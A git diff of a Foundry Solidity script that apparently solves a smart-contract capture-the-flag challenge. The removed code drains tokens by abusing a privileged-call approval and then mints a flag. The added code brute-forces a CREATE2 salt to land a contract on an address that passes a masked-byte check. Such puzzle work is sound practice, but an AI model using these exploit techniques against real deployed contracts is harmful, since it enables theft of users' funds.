@@ -3,44 +3,75 @@ pragma solidity ^0.8.13;
 
 import {Script} from "forge-std/Script.sol";
 import {console} from "forge-std/console.sol";
+import {Challenge11Caller} from "../src/Challenge11.sol";
 
-interface IChallenge11 {
-    function privilegedcall(address target, bytes memory data) external;
-
-    function transferFrom(address from, address to, uint256 amount) external;
-
-    function mintFlag() external;
+contract Create2Deployer {
+    function deploy(
+        bytes memory code,
+        bytes32 salt
+    ) public returns (address addr) {
+        assembly {
+            addr := create2(0, add(code, 0x20), mload(code), salt)
+            if iszero(extcodesize(addr)) {
+                revert(0, 0)
+            }
+        }
+    }
 }
 
 contract Challenge11Script is Script {
     function setUp() public {}
 
+    function calculateAddress(
+        address deployer,
+        bytes32 salt,
+        bytes memory bytecode
+    ) public pure returns (address) {
+        bytes32 hash = keccak256(
+            abi.encodePacked(bytes1(0xff), deployer, salt, keccak256(bytecode))
+        );
+        return address(uint160(uint256(hash)));
+    }
+
     function run() public {
         uint256 privateKey = vm.envUint("PRIVATE_KEY");
-        address target = 0x3b827BDB43dc410A120f10AF3CBe26b59F4e199C;
-        address attacker = 0x0000007EabfC2E6a6b33b21D2f73D58941BAb574;
+        address origin = 0x0000007EabfC2E6a6b33b21D2f73D58941BAb574;
 
+        // Get the bytecode of our contract
+        bytes memory bytecode = type(Challenge11Caller).creationCode;
+
+        // Deploy the Create2Deployer first
         vm.startBroadcast(privateKey);
+        Create2Deployer deployer = new Create2Deployer();
+        vm.stopBroadcast();
 
-        IChallenge11 challenge = IChallenge11(target);
+        // Calculate a valid salt
+        uint8 originLast = uint8(abi.encodePacked(origin)[19]);
+        uint8 originMasked = originLast & 0x15;
 
-        // Step 1: Call privilegedcall with approve data
-        bytes memory approveData = abi.encodeWithSignature(
-            "approve(address,uint256)",
-            attacker,
-            10000000
-        );
-        challenge.privilegedcall(target, approveData);
-        console.log("Step 1: Called privilegedcall with approve data");
+        bytes32 salt;
+        address predictedAddress;
 
-        // Step 2: Call transferFrom
-        challenge.transferFrom(target, attacker, 5000000);
-        console.log("Step 2: Called transferFrom");
+        // Try different salts until we find one that gives us a valid address
+        for (uint256 i = 0; i < type(uint256).max; i++) {
+            salt = bytes32(i);
+            predictedAddress = calculateAddress(
+                address(deployer),
+                salt,
+                bytecode
+            );
 
-        // Step 3: Call mintFlag
-        challenge.mintFlag();
-        console.log("Step 3: Called mintFlag");
+            uint8 senderLast = uint8(abi.encodePacked(predictedAddress)[19]);
+            if ((senderLast & 0x15) == originMasked) {
+                console.log("Found valid salt:", uint256(salt));
+                console.log("Predicted address:", predictedAddress);
+                break;
+            }
+        }
 
+        // Deploy the contract with the found salt
+        vm.startBroadcast(privateKey);
+        deployer.deploy(bytecode, salt);
         vm.stopBroadcast();
     }
 }
